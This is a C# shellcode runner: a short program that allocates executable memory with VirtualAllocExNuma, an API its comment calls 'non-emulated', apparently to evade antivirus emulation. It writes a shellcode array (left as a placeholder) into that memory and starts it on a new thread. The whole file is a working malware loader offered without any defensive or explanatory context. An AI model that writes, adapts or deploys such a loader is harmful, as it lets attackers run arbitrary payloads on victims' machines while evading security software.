using System;
using System.Runtime.InteropServices;

class ShellcodeRunner
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    // Non-emulated API VirtualAlloxExNuma
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect,
        uint nndPreferred);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main()
    {
	// SHELLCODE BYTES HERE
        byte[] shellcode = new byte[] {
            ...
        };

        IntPtr hProcess = GetCurrentProcess();

        // Allocate memory with VirtualAllocExNuma
        IntPtr addr = VirtualAllocExNuma(
            hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
            0       // NUMA node 0
        );

        if (addr == IntPtr.Zero)
        {
            Console.WriteLine("Memory allocation failed.");
            return;
        }

        // Write shellcode to allocated memory
        IntPtr bytesWritten;
        bool result = WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out bytesWritten);

        if (!result || bytesWritten.ToInt32() != shellcode.Length)
        {
            Console.WriteLine("Failed to write shellcode.");
            return;
        }

        // Create thread to execute shellcode
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);

        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create thread.");
            return;
        }

        // Wait for thread to finish
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
